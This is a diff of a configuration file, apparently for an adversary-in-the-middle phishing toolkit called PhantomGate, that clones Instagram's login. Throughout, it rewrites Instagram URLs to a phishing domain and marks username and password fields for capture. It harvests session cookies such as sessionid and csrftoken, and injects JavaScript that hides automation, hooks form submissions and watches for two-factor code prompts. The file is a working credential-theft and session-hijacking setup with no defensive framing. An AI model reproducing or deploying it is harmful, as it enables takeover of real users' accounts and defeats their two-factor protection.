@@ -1,63 +1,88 @@
-name: "Instagram"
-author: "PhantomGate"
-min_ver: "1.0.0"
+name: Instagram
+author: PhantomGate
+version: 2.0.0
+description: Instagram authentication - Pixel-perfect replica
 
-proxy_hosts:
-  - phish_sub: "www"
-    orig_sub: "www.instagram.com"
-    domain: "instagram.com"
-    session: true
-    is_ssl: true
-  - phish_sub: "static"
-    orig_sub: "static.cdninstagram.com"
-    domain: "cdninstagram.com"
-    session: false
-    is_ssl: true
-  - phish_sub: "api"
-    orig_sub: "i.instagram.com"
-    domain: "instagram.com"
-    session: false
-    is_ssl: true
+auth:
+  domains:
+    - www.instagram.com
+    - instagram.com
+    - api.instagram.com
+  
+  login:
+    domain: www.instagram.com
+    path: /accounts/login
+    username:
+      selector: "input[name='username']"
+      capture: true
+    password:
+      selector: "input[name='password']"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: ds_user_id
+        regex: ".*"
+      - name: sessionid
+        regex: ".*"
+      - name: csrftoken
+        regex: ".*"
+      - name: rur
+        regex: ".*"
+      - name: mid
+        regex: ".*"
+      - name: ig_did
+        regex: ".*"
+      - name: ig_nrcb
+        regex: ".*"
+      - name: X-IG-App-ID
+        regex: ".*"
 
-sub_filters:
-  - triggers_on: "www.instagram.com"
-    orig_sub: "www"
-    domain: "instagram.com"
-    search: "www.instagram.com"
-    replace: "www.{phish_domain}"
-    mimes: ["text/html", "application/javascript", "application/json"]
-  - triggers_on: "www.instagram.com"
-    orig_sub: "www"
-    domain: "instagram.com"
-    search: "static.cdninstagram.com"
-    replace: "static.{phish_domain}"
-    mimes: ["text/html", "application/javascript"]
-  - triggers_on: "www.instagram.com"
-    orig_sub: "www"
-    domain: "instagram.com"
-    search: "i.instagram.com"
-    replace: "api.{phish_domain}"
-    mimes: ["text/html", "application/javascript", "application/json"]
+proxy:
+  hosts:
+    - domain: www.instagram.com
+      inject: true
+    - domain: instagram.com
+      inject: true
+  
+  sub_filters:
+    - domain: www.instagram.com
+      search: "https://www.instagram.com"
+      replace: "https://{phishing_domain}"
 
-credentials:
-  username:
-    key: "username"
-    search: ""
-    type: "json"
-  password:
-    key: "enc_password"
-    search: "#PWD_INSTAGRAM"
-    type: "json"
-
-auth_tokens:
-  - domain: ".instagram.com"
-    keys:
-      - "sessionid"
-      - "csrftoken"
-      - "ds_user_id"
-      - "rur"
-      - "mid"
-
-landing_path:
-  - "/"
-  - "/accounts/login/"
+injection:
+  js: |
+    // PhantomGate Injection - Instagram
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('input[name="username"]');
+        var password = form.querySelector('input[name="password"]');
+        if (username && password) {
+          console.log('[PhantomGate] Instagram credentials captured');
+        }
+      }, true);
+      
+      // Monitor for 2FA prompt
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          if (mutation.addedNodes.length) {
+            var node = mutation.addedNodes[0];
+            if (node.nodeType === 1) {
+              var otp = node.querySelector('input[name="verificationCode"]');
+              if (otp) {
+                console.log('[PhantomGate] 2FA prompt detected');
+              }
+            }
+          }
+        });
+      });
+      
+      observer.observe(document.body, {childList: true, subtree: true});
+    })();
